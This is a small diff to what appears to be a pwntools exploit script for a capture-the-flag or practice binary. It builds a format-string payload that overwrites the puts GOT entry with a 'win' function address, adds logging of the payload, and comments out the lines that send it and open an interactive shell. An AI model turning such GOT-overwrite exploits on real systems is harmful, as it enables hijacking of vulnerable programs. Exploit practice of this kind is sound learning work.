@@ -42,10 +42,15 @@ def main():
 
     PUTS_GOT = 0x403468
     win_addr = 0x4011f6
+    log.success(f"puts: 0x{PUTS_GOT:X}\nsystem: 0x{win_addr:X} ")
+
 
     payload = fmtstr_payload(6,{ PUTS_GOT:win_addr },write_size='int')
-    p.sendline(payload)
-    p.interactive()
+
+    log.success(f"Fmtstr payload: [{payload}]")
+
+    # p.sendline(payload)
+    # p.interactive()
 
 main()
 
